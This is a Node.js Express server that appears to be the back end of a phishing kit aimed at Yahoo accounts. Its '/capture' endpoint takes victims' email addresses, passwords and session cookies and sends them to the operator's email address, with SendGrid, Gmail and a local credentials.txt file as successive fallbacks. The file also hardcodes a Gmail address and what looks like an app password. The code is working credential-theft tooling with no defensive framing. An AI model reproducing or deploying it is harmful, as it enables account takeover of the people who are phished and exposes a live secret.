const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const sendgridMail = require('@sendgrid/mail');
const fs = require('fs').promises;
const app = express();
const port = process.env.PORT || 3000; // Render assigns PORT

// Middleware
app.use(express.json());
app.use(cors({
    origin: '*', // Restrict to your front-end domain in production
    methods: ['POST'],
    allowedHeaders: ['Content-Type']
}));

// Health check endpoint
app.get('/health', (req, res) => {
    res.status(200).send('Server is running');
});

// Set SendGrid API key
sendgridMail.setApiKey(process.env.SENDGRID_API_KEY);

// Fallback: Gmail transporter
const gmailTransporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'doyinbayo19@gmail.com',
        pass: 'zdsx fwjv aalm ixaq'
    }
});

// Verify Gmail transporter
gmailTransporter.verify((error, success) => {
    console.log(error ? `Gmail transporter error:${error}` : 'Gmail transporter ready');
});

// Endpoint to capture email, password, stay signed in status, and cookies
app.post('/capture', async (req, res) => {
    try {
        const { email, password, staySignedIn, cookies } = req.body;
        if (!email || !password) {
            console.log('Missing email or password:', req.body);
            return res.status(400).send('Missing email or password');
        } const data = `            Email:${email}
            Password:${password}
            Stay Signed In:${staySignedIn}
            Cookies:${cookies || 'None'}
            Timestamp:${new Date().toISOString()}
        `;
        const mailOptions = {
            from: process.env.GMAIL_USER || 'doyinbayo19@gmail.com',
            to: process.env.GMAIL_USER || 'doyinbayo19@gmail.com',
            subject: 'New Yahoo Login Capture',
            text: data
        };
        // Try SendGrid API
        try {
            await sendgridMail.send(mailOptions);
            console.log('Email sent via SendGrid API:', data);
        } catch (sendGridError) {
            console.error('SendGrid API error:', sendGridError);
            // Fallback to Gmail
            try {
                await gmailTransporter.sendMail(mailOptions);
                console.log('Email sent via Gmail (fallback):', data);
            } catch (gmailError) {
                console.error('Gmail error:', gmailError);
                // Fallback to file logging
                try {
                    await fs.appendFile('credentials.txt', data + '\n');
                    console.log('Data logged to file:', data);
                } catch (fileError) {
                    console.error('File logging error:', fileError);
                }
            }
        } res.status(200).send('Data received');
    } catch (err) {
        console.error('Error processing request:', err);
        res.status(500).send('Server error');
    }
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});